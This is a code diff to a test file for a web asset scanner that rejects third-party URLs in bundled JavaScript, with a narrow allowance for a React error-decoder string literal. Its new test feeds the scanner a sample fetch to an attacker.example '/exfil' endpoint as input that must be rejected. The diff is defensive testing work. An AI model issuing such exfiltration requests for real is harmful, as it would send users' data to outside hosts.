@@ -13,8 +13,10 @@ import { createLocalOperatorServer } from "../src/operator-ui/server";
 // fixable 503 instead of a silent blank page.
 
 // React's SVG namespace string is data, not a network origin. reactjs.org
-// appears only inside React's production error-decoder string literals —
-// never fetched — so the scanner allowlists it explicitly.
+// appears only inside React's production error-decoder string literals.
+// The React 19 decoder adds a separate react.dev/errors URL literal to the
+// bundled JavaScript. Match that single compiler-emitted source spelling
+// below; never allow react.dev as a general third-party asset origin.
 //
 // Zod is in the bundle because compliance packs zod-parse at module load
 // (fail-fast if shipped data is invalid). Its shipped string constants are
@@ -28,9 +30,16 @@ const SAFE_URL =
 function assertFirstPartyOnly(text: string, label: string) {
   const urls = text.match(/https?:\/\/[^"'\s)<>]+/g) ?? [];
   for (const url of urls) {
-    assert.match(
-      url,
-      SAFE_URL,
+    // The React production error decoder constructs a help URL in a string
+    // literal. It is not an imported script, asset, beacon, or fetch target.
+    // Keep the single observed minified spelling pinned, rather than
+    // allowlisting react.dev (which would mask an active third-party URL).
+    const reactErrorDecoder =
+      label.startsWith("/assets/") &&
+      label.endsWith(".js") &&
+      url === "https://react.dev/errors/`+e;if(1";
+    assert.ok(
+      SAFE_URL.test(url) || reactErrorDecoder,
       `${label} carries a third-party origin: ${url}`,
     );
   }
@@ -139,4 +148,20 @@ describe("missing build surfaces a fixable state", () => {
       await new Promise<void>((resolve) => server.close(() => resolve()));
     }
   });
+});
+
+test("first-party asset scanner rejects executable third-party origins and other React URLs", () => {
+  for (const text of [
+    'fetch("https://attacker.example/exfil")',
+    'fetch("https://react.dev/errors/123")',
+    'const image = "https://react.dev/another-path"',
+    '<script src="https://react.dev/errors/123"></script>',
+  ]) {
+    assert.throws(() => assertFirstPartyOnly(text, "/assets/sample.js"), /third-party origin/);
+  }
+  // Inert decoder source is tolerated only for a bundled JavaScript asset,
+  // never as a URL in served HTML or stylesheet markup.
+  const decoder = 'https://react.dev/errors/`+e;if(1';
+  assert.doesNotThrow(() => assertFirstPartyOnly(decoder, "/assets/sample.js"));
+  assert.throws(() => assertFirstPartyOnly(decoder, "served shell"), /third-party origin/);
 });
